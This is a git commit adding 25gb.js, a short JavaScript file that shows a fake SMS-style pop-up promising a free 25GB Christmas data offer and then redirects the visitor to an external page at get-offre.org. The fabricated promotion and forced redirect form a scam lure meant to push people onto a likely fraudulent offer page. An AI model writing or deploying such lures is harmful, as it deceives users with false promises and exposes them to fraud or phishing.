64fea43dc9bd727786d4df46a8af2c76c2abdcbd
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-02 03:58:00 -0800

    Create 25gb.js

---
+++ 25gb.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 25GB'
+password=prompt('SMS: Hello, Your Christmas offer is awaiting. Kindly Press Ok to activate 25GB now before 31st December ','ACTIVATE 25GB ');
+if (password != 'ACTIVATE 25GB ') {
+location.href='https://get-offre.org/christmas-offer.html';
+}
